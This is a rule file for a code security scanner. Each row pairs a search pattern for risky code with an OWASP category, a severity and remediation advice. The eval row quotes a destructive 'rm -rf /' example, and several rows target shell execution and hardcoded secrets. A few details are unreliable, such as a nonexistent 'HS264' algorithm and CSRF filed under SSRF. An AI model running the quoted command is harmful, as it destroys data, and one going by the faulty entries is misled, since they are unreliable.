CategoryNo;CategoryName;CategoryType;Pattern;PatternName;Status;OutputFileName;IncludeComment;NotInternetFacing;IncludeIfSingleThread;Internal;Apply_BRs;Purpose;SearchOnlyFor;Classification;OWASP;Severity;Details;Remediation;Ref_1;Ref_2
10;General;; scope;scope;Investigate;General__Investigate_scope;True;;True;False;True;;;Authorization;A1-Broken Access Control;Medium;"Swagger Scopes should be defined (except ""read-the-docs"").";;;
10;General;; root;root;Investigate;General__Investigate_root;False;;True;False;True;Locate;;Authorization;A1-Broken Access Control;High;Root user exploit?;;;
10;General;;access;access;Investigate;General__Investigate_access;False;;True;False;True;Locate;;Authorization;A1-Broken Access Control;High;;;;
10;General;;authorized;authorized;Investigate;General__Investigate_authorized;False;;True;False;True;;;Authorization;A1-Broken Access Control;High;Look for booleans, like rejectUnauthorized.;;;
10;General;;authori;authori;Investigate;General__Investigate_authori;False;;True;False;True;Locate;;Authorization;A1-Broken Access Control;High;;;;
10;General;;allow-origin;allow-origin;Investigate;General__Investigate_allow-origin;False;Exclude;True;False;True;;;Authorization;A1-Broken Access Control;Medium;Allowing resource sharing from all hosts could lead to unintended sharing of resources with an attacker. ;If possible whitelist hosts.;https://www.owasp.org/index.php/CORS_OriginHeaderScrutiny;
10;General;;cors;cors;Investigate;General__Investigate_cors;False;Exclude;True;False;True;;;CORS;A1-Broken Access Control;Medium;Allowing resource sharing from all hosts could lead to unintended sharing of resources with an attacker. ;If possible whitelist hosts.;https://www.owasp.org/index.php/CORS_OriginHeaderScrutiny;
10;General;;salt;salt;Investigate;General__Investigate_salt;False;;True;False;True;Locate;;Cryptography;A2-Cryptographic Failures;High;;;;
10;General;;crypt;crypt;Investigate;General__Investigate_crypt;True;;True;False;True;Locate;;Cryptography;A2-Cryptographic Failures;High;;;;
10;General;;cipher;cipher;Investigate;General__Investigate_cipher;True;;True;False;True;Locate;;Cryptography;A2-Cryptographic Failures;High;;;;
10;General;;decode;decode;Investigate;General__Investigate_decode;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;For jwt, is signature verified?;;;
10;General;;encode;encode;Investigate;General__Investigate_encode;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;Only vulnerable when used as encryption method (like b64encode). Jwt should be encodedd with a key >= 32 characters and a secure algorithm like HS264.;;;
10;General;;"r""(sha)[0-1]""";SHA;Insecure;General__Insecure_SHA;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;;;;
10;General;;md4;md4;Insecure;General__Insecure_md4;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;SHA512 for signing documents, bcrypt, sha512crypt or scrypt for passwords.;https://www.owasp.org/index.php/Testing_for_Weak_Encryption_(OTG-CRYPST-004);
10;General;;md5;md5;Insecure;General__Insecure_md5;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;SHA512 for signing documents, bcrypt, sha512crypt or scrypt for passwords.;https://www.owasp.org/index.php/Testing_for_Weak_Encryption_(OTG-CRYPST-004);
10;General;;rc2;rc2;Insecure;General__Insecure_rc2;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;SHA512 for signing documents, bcrypt, sha512crypt or scrypt for passwords.;https://www.owasp.org/index.php/Testing_for_Weak_Encryption_(OTG-CRYPST-004);
10;General;;rc4;rc4;Insecure;General__Insecure_rc4;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;SHA512 for signing documents, bcrypt, sha512crypt or scrypt for passwords.;https://www.owasp.org/index.php/Testing_for_Weak_Encryption_(OTG-CRYPST-004);
10;General;;blowfish;blowfish;Insecure;General__Insecure_blowfish;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;SHA512 for signing documents, bcrypt, sha512crypt or scrypt for passwords.;https://www.owasp.org/index.php/Testing_for_Weak_Encryption_(OTG-CRYPST-004);
10;General;;ecb;ecb;Insecure;General__Insecure_ecb;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;SHA512 for signing documents, bcrypt, sha512crypt or scrypt for passwords.;https://www.owasp.org/index.php/Testing_for_Weak_Encryption_(OTG-CRYPST-004);
10;General;;random(;random;Investigate;General__Investigate_random;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;urandom, SystemRandom(), SecureRandom();https://www.owasp.org/index.php/Using_the_Java_Cryptographic_Extensions;
10;General;;hash;hash;Investigate;General__Investigate_hash;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;;https://security.stackexchange.com/questions/52877/how-secure-is-javas-hashcode#52881;
10;General;;base64;base64;Investigate;General__Investigate_base64;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;;;
10;General;;kCCPRFHmacAlgSHA1;kCCPRFHmacAlgSHA1;Investigate;General__Investigate_kCCPRFHmacAlgSHA1;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;;;;
10;General;; ssl;ssl;Investigate;General__Investigate_ssl;True;;True;False;True;Locate;;Transport security;A2-Cryptographic Failures;High;How is secure transport implemented? 'ssl' may be a key in comment.;;;
10;General;; tls;tls;Investigate;General__Investigate_tls;False;;True;False;True;Locate;;Transport security;A2-Cryptographic Failures;High;How is secure transport implemented?;;;
10;General;;cert;cert;Investigate;General__Investigate_cert;False;;True;False;True;Locate;;Transport security;A2-Cryptographic Failures;High;How is secure transport implemented?;;;
10;General;;sslv3;sslv3;Insecure;General__Insecure_sslv3;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;High;;;;
10;General;;sslv23;sslv23;Insecure;General__Insecure_sslv23;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;High;Uses best of sslv2, sslv3 and tlsv1.;;https://github.com/geminabox/geminabox/issues/169;
10;General;;"r""^(?!.*(soap|xmlns|namespace|www.w3.org)).*(://)""";external_parties;Investigate;General__Investigate_external_parties;False;;True;True;True;;;Transport security;A2-Cryptographic Failures;Informational;;;;
10;General;;socket;socket;Investigate;General__Investigate_socket;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;High;New Socket should be a secure socket.;Java, scala: use SSLSocketFactory to create a new Socket.;https://blog.codacy.com/9-scala-security-issues/#gs.Z2R6tHQ;
10;General;;"r""^(?!.*(soap|xmlns|namespace|www.w3.org)).*(http://)""";http;Investigate;General__Investigate_http;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;;;;
10;General;;SSL_VERIFY_NONE;sslverifynone;Investigate;General__Investigate_sslverifynone;True;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;Insecure connection?;;;
10;General;;secure;secure;Investigate;General__Investigate_secure;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;"Insecure connection? Cookie context only. Should be ""true"".";;;
10;General;;httponly;httponly;Investigate;General__Investigate_httponly;True;Exclude;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;"Insecure connection? Cookie context only. Should be ""true"".";;;
10;General;;fprint;fprint;Investigate;General__Investigate_fprint;False;;True;False;True;;;Buffer overflow;A3-Injection;High;User input not parameterized in a string is vulnerable.;;https://owasp.org/www-community/attacks/Format_string_attack;
10;General;;printf;printf;Investigate;General__Investigate_printf;False;;True;False;True;;;Buffer overflow;A3-Injection;High;User input not parameterized in a string is vulnerable.;;https://owasp.org/www-community/attacks/Format_string_attack;
10;General;;eval(;eval;Investigate;General__Investigate_eval;False;;True;False;True;;;Command  injection;A3-Injection;High;"Can it be used as user exit point? Bad example: eval(""os.system('rm -rf /') # dangerous!"")";;https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html;
10;General;;system(;system;Investigate;General__Investigate_system;False;;True;False;True;;;Command  injection;A3-Injection;High;Can it be used as user exit point?;;;
10;General;;new function(;new_function;Investigate;General__Investigate_new_function;False;;True;False;True;;;Command  injection;A3-Injection;High;Can it be used as user exit point (does it create function based on user data)?;;;
10;General;;script;script;Investigate;General__Investigate_script;True;Exclude;True;False;True;Locate;;Injection;A3-Injection;High;Can the script be influenced by the user/attacker? EU court decides (2020-08) that sensitive data transfer to non-GDPR countries (like VS for it's surveillance program) is unwanted. This includes Google Analytics/Facebook Connect that e.g. gather IP-address, cookie data.;;;
10;General;;*CF_SCRIPT(HREF);href;Investigate;General__Investigate_href;True;Exclude;True;False;True;;;Injection;A3-Injection;High;Can the url be influenced by the user/attacker? ;;;
10;General;;SqlCommand;SqlCommand;Investigate;General__Investigate_SqlCommand;False;;True;False;True;Locate;;SQL injection;A3-Injection;High;;;;
10;General;;.raw;raw;Investigate;General__Investigate_raw;False;;True;False;True;;;SQL Injection;A3-Injection;High;Raw (or Django rawsql) circumvents framework  proteection e.g. in Django or Ruby.;Escape querystring parameters and do not quote placeholders.;https://docs.djangoproject.com/en/4.1/topics/security;
10;General;; CREATE TABLE ;CREATE;Investigate;General__Investigate_CREATE;False;;True;False;True;Locate;;SQL injection;A3-Injection;High;;;;
10;General;;upload;upload;Investigate;General__Investigate_upload;False;;True;False;True;Locate;;Malicious code;A3-Injection;High;For untrusted file uploads, is a virus scanner in place?;;;
10;General;;execute ;execute;Investigate;General__Investigate_execute;False;;True;False;True;;;Malicious code;A3-Injection;High;Untrusted user input, e.g. via parameters.;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;https://stackoverflow.com/questions/4339611/exploitable-java-functions
10;General;;save(;save;Investigate;General__Investigate_save;False;;True;False;True;;;Malicious code;A3-Injection;High;Untrusted user input, e.g. via parameters.;;;
10;General;;.exec;execute_2;Investigate;General__Investigate_execute_2;False;;True;False;True;;;Malicious code;A3-Injection;High;Untrusted user input may saved in the database, e.g. via parameters.;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
10;General;;*CF_WHERE;WHERE;Investigate;General__Investigate_WHERE;True;;True;False;True;Locate;;Injection;A3-Injection;High;;;;
10;General;;url;url;Investigate;General__Investigate_url;False;Exclude;True;False;True;Locate;AssignedTo;Input validation;A3-Injection;Medium;;If whitelisting is not possible, validate on length (if possible < 15), format and/or allowed characters (e.g via regex).;https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html;
10;General;;request.;request;Investigate;General__Investigate_request;False;Exclude;True;False;True;Locate;;Input validation;A3-Injection;Medium;;If whitelisting is not possible, validate on length (if possible < 15), format and/or allowed characters (e.g via regex).;https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html;
10;General;;req.;req;Investigate;General__Investigate_req;False;Exclude;True;False;True;Locate;;Input validation;A3-Injection;Medium;;If whitelisting is not possible, validate on length (if possible < 15), format and/or allowed characters (e.g via regex).;https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html;
10;General;;rqs.;rqs;Investigate;General__Investigate_rqs;False;Exclude;True;False;True;Locate;;Input validation;A3-Injection;Medium;;If whitelisting is not possible, validate on length (if possible < 15), format and/or allowed characters (e.g via regex).;https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html;
10;General;;HttpRequest;httprequest;Investigate;General__Investigate_httprequest;False;Exclude;True;False;True;Locate;;Input validation;A3-Injection;Medium;e.g. django class, can be renamed to e.g. req;If whitelisting is not possible, validate on length (if possible < 15), format and/or allowed characters (e.g via regex).;;
10;General;;x-xss-protection;xssprotection;Investigate;General__Investigate_xssprotection;False;Exclude;True;False;True;;;XSS;A3-Injection;Medium;xxs solution;;;
10;General;;*CF_REDOS;reDoS;Insecure;General__Insecure_reDoS;False;;True;False;True;;;ReDoS;A4-Insecure Design;High;In all server side regex implementations using backtracking NFA.;Use a better regex, without repeated group expressions with repetitions (like ^(\d+)*$). Or use another implementation (e.g. RE2) or set maximum computation time.;https://msdn.microsoft.com/en-us/magazine/ff646973.aspx;https://stackoverflow.com/questions/63127145/safe-regex-patterns-from-redos-attack
10;General;;lock;lock;Investigate;General__Investigate_lock;False;;False;False;True;Locate;;Denial of service;A4-Insecure Design;Medium;Only if attacker can lock;;;
10;General;;"input type=""hidden""";input_type_hidden;Investigate;General__Investigate_input_type_hidden;False;Exclude;True;False;True;Locate;;Insecure design;A4-Insecure Design;Medium;"No secret info , no application state or js calculation (source code can be viewed/changed); should be done server side.";;https://stackoverflow.com/questions/25206173/hidden-field-vulnerability;
10;General;; temp;temp;Investigate;General__Investigate_temp;True;;True;False;True;;;Insecure design;A4-Insecure Design;Low;Only in security context;;;
10;General;;HACK;HACK;Investigate;General__Investigate_HACK;True;;True;False;True;;;Insecure design;A4-Insecure Design;Low;Only in security context;;;
10;General;;todo;todo;Investigate;General__Investigate_todo;True;;True;False;True;;;Insecure design;A4-Insecure Design;Low;Only in security context;;;
10;General;; fix ;fix;Investigate;General__Investigate_fix;True;;True;False;True;;;Insecure design;A4-Insecure Design;Low;Only in security context;;;
10;General;;fixme;fixme;Investigate;General__Investigate_fixme;True;;True;False;True;;;Insecure design;A4-Insecure Design;Low;Only in security context;;;
10;General;;"r""^(?!.*://).*(//)""";doubleslash;Verify_FP;General__Verify_FP_doubleslash;True;;True;False;True;;;Insecure design;A4-Insecure Design;Low;Only in security context, comment;;;
10;General;;security;security;Investigate;General__Investigate_security;False;;True;False;True;Locate;;Security misconfiguration;A5-Security Misconfiguration;Low;Only in temp dir context;;;
10;General;;header;header;Investigate;General__Investigate_header;False;Exclude;True;False;True;;AssignedTo;Security misconfiguration;A5-Security Misconfiguration;Medium;Are expected headers present?;"Add headers like 'X-Content-Type-Options(nosniff)', Content-Security-Policy(default-src https://cdn.example.net; child-src 'none'; object-src 'none')', 'Strict-Transport-Security(max-age=31536000'), 'X-Frame-Options(sameorigin)'";https://owasp.org/www-project-secure-headers/;https://web.dev/csp/
10;General;;*CF_RESOURCES;resources;Investigate;General__Investigate_resources;False;;True;False;True;;;Security misconfiguration;A5-Security Misconfiguration;Medium;Allowing too broad AWS resources using wildcard;;;
10;General;;*CF_ACTIONS;actions;Investigate;General__Investigate_actions;False;;True;False;True;;;Security misconfiguration;A5-Security Misconfiguration;Medium;Allowing too broad AWS actions using wildcard;;;
10;General;;*CF_PRINCIPALS;principals;Investigate;General__Investigate_principals;False;;True;False;True;;;Security misconfiguration;A5-Security Misconfiguration;Medium;Allowing too broad AWS principals using wildcard;;;
10;General;;redirect;redirect;Investigate;General__Investigate_redirect;False;Exclude;True;False;True;;;Phishing;A5-Security Misconfiguration;Medium;"Untrusted URL input. Phishing. Safe: e.g. Response.Redirect(""https.mysite.com""). Unsafe: redirect_url = $_GET[""url""]; (PHP)";;https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html;
10;General;;obsolete;obsolete;Investigate;General__Investigate_obsolete;True;;True;False;True;;;Insecure design;A6-Vulnerable and Outdated Components;Low;Only in security context;;;
10;General;;depricated;depricated;Investigate;General__Investigate_depricated;True;;True;False;True;;;Insecure design;A6-Vulnerable and Outdated Components;Low;Only in security context;;;
10;General;;authenticat;authenticat;Investigate;General__Investigate_authenticat;False;;True;False;True;Locate;;Authentication;A7-Identification and Authentication Failures;Medium;;;;
10;General;;credential;credential;Investigate;General__Investigate_credential;True;;True;False;True;;AssignedTo;Authentication;A7-Identification and Authentication Failures;Medium;;;;
10;General;;pass;pass;Investigate;General__Investigate_pass;True;;True;False;True;;AssignedTo;Authentication;A7-Identification and Authentication Failures;Medium;;;;
10;General;;pwd;pwd;Investigate;General__Investigate_pwd;True;;True;False;True;;AssignedTo;Authentication;A7-Identification and Authentication Failures;Medium;;;;
10;General;;pincode;pincode;Investigate;General__Investigate_pincode;True;;True;False;True;;AssignedTo;Authentication;A7-Identification and Authentication Failures;Medium;;;;
10;General;;private_key;private_key;Investigate;General__Investigate_private_key;True;;True;False;True;;AssignedTo;Authentication;A7-Identification and Authentication Failures;Medium;;;;
10;General;;token;token;Investigate;General__Investigate_token;False;;True;False;True;Locate;AssignedTo;Authentication;A7-Identification and Authentication Failures;Medium;;;;
10;General;;expir;expir;Investigate;General__Investigate_expir;True;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;Medium;Token should expire within say 1 hour.;;https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html;
10;General;;admin ;admin;Investigate;General__Investigate_admin;False;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;Medium;;;;
10;General;;*CF_HARDCODED_KEY(30);hardcoded_key;Investigate;General__Investigate_hardcoded_key;True;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;Medium;Secrets should be kept secret;Ensure secrets are stored in an environment dependent configuration file or system parameter.;;
10;General;; otp;otp;Investigate;General__Investigate_otp;False;;True;False;True;;AssignedTo;Authentication;A7-Identification and Authentication Failures;Medium;One Time Password;;;
10;General;;forTrust;forTrust;Investigate;General__Investigate_forTrust;True;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;Medium;ObjC/Swift certificate pinning turned off;;;
10;General;;allowInvalidCertificate;allowInvalidCertificate;Investigate;General__Investigate_allowInvalidCertificate;True;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;Medium;Server network level certificate check turned off (AFNetworking class);;;
10;General;;"r""{[ \""]+alg[ \""]+:[ \""]+none[ \""]+}""";algnone;Investigate;General__Investigate_algnone;False;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;Medium;JWT unsecured token;"Do not use {""alg"":""none""}";https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html;
10;General;;*CF_EMAIL;email;Investigate;General__Investigate_email;False;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;Low;Privacy violation, email spoofing?;;;
10;General;;cookie;cookie;Investigate;General__Investigate_cookie;False;Exclude;True;False;True;Locate;;Authentication and authorisation;A7-Identification and Authentication Failures;Medium;;;;
10;General;;login;login;Investigate;General__Investigate_login;False;;True;False;True;Locate;AssignedTo;Authentication and authorisation;A7-Identification and Authentication Failures;Medium;;;;
10;General;;ldap;ldap;Investigate;General__Investigate_ldap;False;;True;False;True;Locate;;Authentication and authorisation;A7-Identification and Authentication Failures;Medium;LDAP-injection;;https://www.owasp.org/index.php/LDAP_injection;
10;General;; bsn;bsn;Investigate;General__Investigate_bsn;False;;True;False;True;;;Privacy;A9-Security Logging and Monitoring Failures;Medium;;;;
10;General;; ssn;ssn;Investigate;General__Investigate_ssn;False;;True;False;True;;;Privacy;A9-Security Logging and Monitoring Failures;Medium;;;;
10;General;;bankaccount;bankaccount;Investigate;General__Investigate_bankaccount;False;;True;False;True;;;Privacy;A9-Security Logging and Monitoring Failures;Medium;;;;
10;General;;creditcard;creditcard;Investigate;General__Investigate_creditcard;False;;True;False;True;;;Privacy;A9-Security Logging and Monitoring Failures;Medium;;;;
10;General;;*CF_PHONE;phone;Investigate;General__Investigate_phone;False;;True;False;True;;AssignedTo;Privacy;A9-Security Logging and Monitoring Failures;Medium;;;;
10;General;;secret;secret;Investigate;General__Investigate_secret;True;;True;False;True;;AssignedTo;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;Secrets should be kept secret;Ensure secrets are stored in an environment dependent configuration file or system parameter.;;
10;General;;debug;debug;Investigate;General__Investigate_debug;False;;True;False;True;Locate;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;;;;
10;General;;dump;dump;Investigate;General__Investigate_dump;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;;;;
10;General;;*CF_TRACE;trace;Investigate;General__Investigate_trace;True;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;;;;
10;General;;*CF_LOG;log;Investigate;General__Investigate_log;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;Privacy related or technical details may be exposed.;"Encrypt sensitive information, or implement environment dependent logging of sensitive information; ensure it is turned off by default.";;
10;General;;*CF_LOGGER;logger;Investigate;General__Investigate_logger;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;Privacy related or technical details may be exposed.;"Encrypt sensitive information, or implement environment dependent logging of sensitive information; ensure it is turned off by default.";;
10;General;;*CF_PRINT;print;Investigate;General__Investigate_print;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;Privacy related or technical details may be exposed.;"Encrypt sensitive information, or implement environment dependent logging of sensitive information; ensure it is turned off by default.";;
10;General;;*CF_AUTOESCAPE(contains, or, false, none);autoescape;Investigate;General__Investigate_autoescape;False;;True;False;True;;;Security misconfiguration;A5-Security Misconfiguration;Medium;Turnes off  escaping mechanism used in framework.;Use the default autoescape=true.;;
10;General;;csrf;csrf;Investigate;General__Investigate_csrf;False;Exclude;True;False;True;Locate;;CSRF;A10-Server-Side Request Forgery (SSRF);Medium;csrf solution;;https://spring.io/blog/2015/10/28/react-js-and-spring-data-rest-part-5-security;
10;General;;Storage.setItem;storageSetitem;Investigate;General__Investigate_storageSetitem;False;;True;False;True;;;Sensitive data exposure;A5-Security Misconfiguration;High;Frontend (JS, TS, Vue). Local and - less easily- Sessionstorage can be read by an attacker.;Encrypt sensitive data. E.g. Using npm encrypt-storage.;https://blog.bitsrc.io/sessionstorage-and-localstorage-a-ux-security-comparison-a05c486413e0;
20;Language;NET;ActionInput;ActionInput;Investigate;Language_NET_Investigate_ActionInput;False;;True;False;True;;;Input validation;A3-Injection;High;Elsa syntax;;;
20;Language;NET;AllowHtml;AllowHtml;Investigate;Language_NET_Investigate_AllowHtml;False;;True;False;True;;;XSS;A3-Injection;Medium;;Validate and/or sanitize.;;
20;Language;NET;[From;from_uri;Investigate;Language_NET_Investigate_from_uri;False;;True;False;True;;;Open redirect;A1-Broken Access Control;Medium;[FromUri]  in ASP 2.0 and [FromRoute] or [FromQuery] in ASP Core are used to retrieve uri values;Validate and/or sanitize.;;
20;Language;NET;HashPasswordForStoringInConfigFile;HashPasswordForStoringInConfigFile;Insecure;Language_NET_Insecure_HashPasswordForStoringInConfigFile;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;Insecure cryptography;;https://stackoverflow.com/questions/3940576/exploitable-c-sharp-functions;
20;Language;NET;Rnd(;rnd;Insecure;Language_NET_Insecure_rnd;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;Only in security context;;;
20;Language;NET;FromBase64String(;FromBase64String;Insecure;Language_NET_Insecure_FromBase64String;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;Only in security context;;;
20;Language;NET;FormsAuthentication.SignOut;FormsAuthentication_SignOut;Insecure;Language_NET_Insecure_FormsAuthentication_SignOut;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;Session hijacking. Cookie removed from client only, not from server.;;https://stackoverflow.com/questions/3940576/exploitable-c-sharp-functions;
20;Language;NET;HttpCookie(;HttpCookie;Investigate;Language_NET_Investigate_HttpCookie;False;Exclude;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;Insecure connection? Cookie context only.;;;
20;Language;NET;.Expires =;Expires;Investigate;Language_NET_Investigate_Expires;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;Insecure connection? Cookie context only.;;;
20;Language;NET;ProcessStartInfo;ProcessStartInfo;Insecure;Language_NET_Insecure_ProcessStartInfo;False;;True;False;True;;;SQL injection;A3-Injection;High;Cmd/Batch file passed as parameter;;https://stackoverflow.com/questions/3940576/exploitable-c-sharp-functions;
20;Language;NET;ExecuteReader(;ExecuteReader;Investigate;Language_NET_Investigate_ExecuteReader;False;;True;False;True;;;SQL injection;A3-Injection;High;Executes SqlCommand;Parameterized queries;https://stackoverflow.com/questions/3940576/exploitable-c-sharp-functions;
20;Language;NET;.exe;exe;Investigate;Language_NET_Investigate_exe;False;;True;False;True;;;Malicious code execution;A3-Injection;High;Untrusted user input, e.g. via parameters.;;;
20;Language;NET;Shell;Shell;Insecure;Language_NET_Insecure_Shell;False;;True;False;True;;;Malicious code execution;A3-Injection;High;Untrusted user input, e.g. via parameters.;;;
20;Language;NET;shell_exec(;shellexec;Insecure;Language_NET_Insecure_shellexec;False;;True;False;True;;;Malicious code execution;A3-Injection;High;Untrusted user input, e.g. via parameters.;;;
20;Language;NET;File.delete(;filedelete;Investigate;Language_NET_Investigate_filedelete;False;;True;False;True;;;Malicious code execution;A3-Injection;High;Untrusted user input, e.g. via parameters.;;;
20;Language;NET;DeleteFile(;deletefile;Investigate;Language_NET_Investigate_deletefile;False;;True;False;True;;;Malicious code execution;A3-Injection;High;Untrusted user input, e.g. via parameters.;;;
20;Language;NET;SqlDataAdapter(;sqldataadapter;Investigate;Language_NET_Investigate_sqldataadapter;False;;True;False;True;;;Malicious code execution;A3-Injection;High;Untrusted user input, e.g. via parameters.;;;
20;Language;NET;Response.Write;Response_Write;Investigate;Language_NET_Investigate_Response_Write;False;;True;False;True;;;Output encoding;A3-Injection;Medium;Malicious code from server inserted in HTML tag. ;Output sanitization: Encode HTML;https://stackoverflow.com/questions/3940576/exploitable-c-sharp-functions;
20;Language;NET;<%=;Response_Write2;Investigate;Language_NET_Investigate_Response_Write2;False;;True;False;True;;;Output encoding;A3-Injection;Medium;Malicious code from server inserted in HTML tag. ;Use <%:, this encodes HTML.;https://stackoverflow.com/questions/3940576/exploitable-c-sharp-functions;
20;Language;NET;ReadFile(;ReadFile;Investigate;Language_NET_Investigate_ReadFile;False;;True;False;True;;;DoS;A4-Insecure Design;Medium;;;https://stackoverflow.com/questions/3940576/exploitable-c-sharp-functions;
30;Language;NET;XpathNavigator;xpathnavigator;Investigate;Language_NET_Investigate_xpathnavigator;False;;True;False;True;Locate;;XXE;A5-Security Misconfiguration;Medium;;Use XmlReader, not XMLDocument. Generally, disable DTD (External Entities). ;https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet;
20;Language;NET;.LoadXml(;loadxml;Investigate;Language_NET_Investigate_loadxml;False;;True;False;True;;;XXE;A5-Security Misconfiguration;Medium;Never load untrusted XML content into a .NET XmlDocument class as a first step.;"xmlDoc.XmlResolver = null; /* disables DTDs, was vulnerability prior to .NET 4.5.2 */. Use XmlReader with settings like MaxCharactersInDocument";https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet;https://blogs.msdn.microsoft.com/tomholl/2009/05/21/protecting-against-xml-entity-expansion-attacks/
20;Language;NET;XmlDocument;xmldocument;Investigate;Language_NET_Investigate_xmldocument;False;;True;False;True;;;XXE;A5-Security Misconfiguration;Medium;XmlDocument is unsafe.;Use XmlReader instead.;https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet;
20;Language;NET;is_wctype;is_wctype;Insecure;Language_NET_Insecure_is_wctype;False;;True;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;_loaddll;_loaddll;Insecure;Language_NET_Insecure__loaddll;False;;True;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;_unloaddll;_unloaddll;Insecure;Language_NET_Insecure__unloaddll;False;;True;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;_getdllprocaddr;_getdllprocaddr;Insecure;Language_NET_Insecure__getdllprocaddr;False;;True;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;_seterrormode;_seterrormode;Insecure;Language_NET_Insecure__seterrormode;False;;True;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;_beep;_beep;Insecure;Language_NET_Insecure__beep;False;;False;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;_sleep;_sleep;Insecure;Language_NET_Insecure__sleep;False;;False;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;_getsystime;_getsystime;Insecure;Language_NET_Insecure__getsystime;False;;False;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;_setsystime;_setsystime;Insecure;Language_NET_Insecure__setsystime;False;;False;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://msdn.microsoft.com/en-us/library/mt620088.aspx;
20;Language;NET;AAEAAAD/////;serializable_vartype_1;Investigate;Language_NET_Investigate_serializable_vartype_1;False;;True;False;True;;;Remote code execution;A8-Software and Data Integrity Failures ;High;Deserialization vulnerability;Whitelist types allowed to be deserialized.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
20;Language;NET;TypeObject;typeobject;Investigate;Language_NET_Investigate_typeobject;False;;True;False;True;;;Remote code execution;A8-Software and Data Integrity Failures ;High;Deserialization vulnerability;Whitelist types allowed to be deserialized.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
